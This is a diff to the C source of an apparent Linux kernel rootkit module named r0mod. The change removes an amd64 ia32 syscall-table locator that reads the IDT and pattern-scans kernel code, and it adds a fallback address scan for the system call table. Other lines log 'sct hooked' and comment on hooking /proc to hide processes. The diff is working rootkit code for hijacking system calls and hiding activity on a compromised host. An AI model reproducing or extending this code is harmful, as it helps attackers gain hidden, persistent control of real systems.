@@ -46,7 +46,6 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
 #endif
 
 unsigned long *sct;
-unsigned long *ia32_sct;
 
 struct s_proc_args
 {
@@ -148,36 +147,9 @@ unsigned long *find_sct(void)
     else
         return NULL;
 }
-
-// Obtain sys_call_table on amd64; pouik
-unsigned long *find_ia32_sct(void)
-{
-    char **p;
-    unsigned long sct_off = 0;
-    unsigned char code[512];
-
-    asm("sidt %0":"=m" (idtr));
-    memcpy(&idt, (void *)(idtr.base + 16 * 0x80), sizeof(idt));
-    sct_off = (idt.off2 << 16) | idt.off1;
-    memcpy(code, (void *)sct_off, sizeof(code));
-
-    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
-
-    if ( p )
-    {
-        unsigned long *sct = *(unsigned long **)((char *)p + 3);
-
-        // Stupid compiler doesn't want to do bitwise math on pointers
-        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);
-
-        return sct;
-    }
-    else
-        return NULL;
-}
 #endif
 
-unsigned long *locate_sct_by_addr_scan(void)
+unsigned long *find_sct_by_addr_scan(void)
 {
     unsigned long i;
 
@@ -382,28 +354,16 @@ static int __init r0mod_init(void)
     DEBUG("Search Start: %lx\n", SEARCH_START);
     DEBUG("Search End:   %lx\n", SEARCH_END);
 
-#if defined(_CONFIG_X86_64_)
-    if((ia32_sct = (void *)find_ia32_sct()) == NULL)
-        DEBUG("ia32_sct == NULL");
-#endif
-
-    return 0;
-
     if((sct = (void *)find_sct()) == NULL)
-        DEBUG("sct == NULL\n");
+        DEBUG("sct == NULL * 1\n");
 
-#if defined(_CONFIG_X86_64_)
-    if(ia32_sct != NULL)
-        DEBUG("ia32_sct hooked @ %lx\n", (unsigned long)ia32_sct);
-#endif
-    if(sct != NULL)
-        DEBUG("sct hooked @ %lx\n", (unsigned long)sct);
-
-    if(ia32_sct == NULL && sct == NULL)
+    if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
     {
-        DEBUG("ia32_sct && sct == NULL ... Exiting!\n");
+        DEBUG("sct == NULL * 2\n");
         return -1;
     }
+
+    DEBUG("sct hooked @ %lx\n", (unsigned long)sct);
 
     /* Hook /proc for hiding processes */
     //proc_iterate = get_vfs_iterate("/proc");
